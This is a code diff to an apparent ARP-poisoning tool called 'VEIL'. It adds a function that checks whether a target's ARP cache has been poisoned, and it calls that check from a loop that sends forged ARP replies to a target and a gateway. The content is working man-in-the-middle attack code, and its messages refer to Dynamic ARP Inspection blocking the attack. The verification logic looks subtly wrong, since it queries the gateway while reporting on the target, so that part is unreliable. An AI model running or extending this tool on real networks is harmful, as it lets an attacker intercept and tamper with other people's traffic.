@@ -70,6 +70,37 @@ def get_gateway_mac(gateway_ip: str, interface: str) -> str:
     return answered[0][1].hwsrc
 
 
+def verify_poison(target_ip: str, gateway_ip: str, interface: str) -> bool:
+    attacker_mac = get_if_hwaddr(interface)
+    verify_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
+        op=1,
+        pdst=gateway_ip,
+        psrc=target_ip,
+    )
+    answered, _ = srp(verify_request, iface=interface, timeout=2, verbose=0)
+
+    if not answered:
+        print("[VEIL] ✗ No ARP response from target — host may be offline.")
+        return False
+
+    reported_mac = None
+    for _, response in answered:
+        if response.haslayer(ARP) and response[ARP].psrc == gateway_ip:
+            reported_mac = response[ARP].hwsrc
+            break
+
+    if reported_mac is None:
+        print("[VEIL] ✗ No ARP response from target — host may be offline.")
+        return False
+
+    if reported_mac.lower() == attacker_mac.lower():
+        print(f"[VEIL] ✓ Poison confirmed on {target_ip}")
+        return True
+
+    print("[VEIL] ✗ Poison unconfirmed — target ARP cache unchanged. DAI may be active.")
+    return False
+
+
 def start_poisoning(
     interface: str,
     gateway_ip: str,
@@ -79,6 +110,8 @@ def start_poisoning(
     interval: int = 2,
 ) -> None:
     attacker_mac = get_attacker_mac(interface)
+    poison_confirmed = False
+    verification_done = False
 
     while True:
         target_packet = _build_arp_reply(
@@ -96,5 +129,8 @@ def start_poisoning(
 
         sendp(target_packet, iface=interface, verbose=0)
         sendp(gateway_packet, iface=interface, verbose=0)
+        if not verification_done:
+            poison_confirmed = verify_poison(target_ip, gateway_ip, interface)
+            verification_done = True
         print(f"\u2192 Poisoning: [{target_ip}] \u2194 [{gateway_ip}]  (Ctrl+C to stop)")
         time.sleep(interval)
